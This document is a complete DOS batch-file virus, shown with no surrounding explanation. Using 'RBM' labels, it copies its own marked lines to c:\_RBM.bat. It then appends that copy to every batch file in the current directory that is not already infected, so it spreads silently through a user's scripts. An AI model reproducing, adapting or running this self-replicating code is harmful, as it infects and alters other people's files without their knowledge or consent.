@echo off%_RBM%
if '%1=='RBM goto RBM%2
if exist c:\_RBM.bat goto RBMg
if not exist %0.bat goto RBMe
find "RBM"<%0.bat>c:\_RBM.bat
:RBMg
command /c c:\_RBM RBM v
goto RBMe
:RBMv
for %%a in (*.bat) do call c:\_RBM RBM i %%a 
exit RBM
:RBMi
find "RBM"<%3>nul
if not errorlevel 1 goto RBMe
type c:\_RBM.bat>>%3
exit RBM
:RBMe
